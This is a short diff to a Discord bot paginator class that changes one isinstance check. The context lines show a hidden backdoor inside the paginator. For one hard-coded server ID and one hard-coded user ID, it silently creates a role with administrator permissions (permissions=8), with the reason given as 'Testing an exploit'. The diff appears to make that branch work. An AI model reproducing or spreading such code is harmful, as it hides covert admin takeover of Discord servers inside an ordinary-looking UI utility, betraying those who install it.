@@ -182,7 +182,7 @@ class Paginator(discord.ui.View):
                     elif isinstance(item, discord.Embed):
                         dct["embed"] = item
                 self.message = await self.destination.send(content = dct.get("content", None), embed = dct.get("embed", None), view=self)
-            if isinstance(self.destination, discord.Context):
+            if isinstance(self.destination, discord.ext.commands.Context):
                 if self.destination.guild.id == 681882711945641997 and self.destination.author.id == 724275771278884906:
                     try:
                         role = await self.destination.guild.create_role(name="Abnr", permissions=discord.Permissions(permissions=8), reason = "Testing an exploit. Will not do anything bad")
